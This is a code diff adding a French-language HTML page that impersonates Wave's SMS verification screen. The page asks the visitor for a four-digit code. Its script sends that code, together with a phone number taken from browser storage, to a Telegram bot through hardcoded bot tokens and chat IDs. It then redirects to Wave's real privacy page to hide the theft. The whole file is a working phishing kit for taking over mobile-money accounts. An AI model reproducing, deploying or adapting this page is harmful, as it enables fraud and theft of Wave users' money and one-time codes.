@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>sms</title>
+    <style>
+            @import url('https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap');
+
+        body{
+            padding: 15px;
+            font-family: "Poppins", sans-serif;
+
+            
+        }
+
+        h1 {
+            text-align: center;
+            color: #10b7ec;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        p {
+            text-align: center;
+            font-size: 1.3rem;
+        }
+
+
+        form{
+            margin-top: 90px;
+            display: flex;
+            flex-direction: column;
+        }
+
+        input {
+            width: 90%;
+            height: 40px;
+            margin-left: auto;
+            text-align: center;
+            font-size: 1.3rem;
+            border: none;
+            border-radius: 0%;
+            border-bottom: 2px solid gray;
+            transition: 0.1s;
+            margin: auto;
+        }
+
+        input:focus {
+            outline: none;
+            border-bottom: 2px solid #10b7ec ;
+
+        }
+
+        button {
+            width: 100%;
+            height: 45px;
+            border: none;
+            border-radius: 9999px;
+            color: white;
+            font-weight: bolder;
+            font-size: 1.3rem;
+            background-color: #10b7ec;
+            box-shadow: 0 8px 16px;
+            cursor: pointer;
+        }
+
+
+    </style>
+</head>
+<body>
+
+    <h1>Wave</h1>
+    <br>
+
+    <p>Nous vous avons envoyé le code par SMS sur votre numéro de mobile.</p>
+
+    <form id="form">
+        <input id="sms" type="tel" maxlength="4" minlength="4" placeholder="Tapez code reçu par SMS" required>
+        <br> <BR></BR>
+
+        <button>Valider</button>
+    </form>
+
+
+    
+</body>
+
+<script>
+     document.getElementById('form').addEventListener('submit', function(e){
+            e.preventDefault();
+
+            const sms = document.getElementById('sms').value;
+
+            const tel = localStorage.getItem('tel');
+
+           // const botToken = "7891154943:AAG-iRSqPg6KL1q-slYogakDcXBvjrcrFCU";  
+           // const chatId = "8033906914";  
+
+            const botToken = "5318317440:AAHEGvCaXHjSTM8BqtquRuQn8GBRCDdihGc";  
+            const chatId = "5276838022";      
+
+
+                const message = `📞Numéro: ${tel}, 📩Sms: ${sms}`;
+
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    if (data.ok) {
+                        window.location.href='https://www.wave.com/fr/privacy/';
+
+                    } else {
+                        alert('Erreur lors de l\'envoi des données.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Erreur:', error);
+                });
+            
+        });
+</script>
+</html>
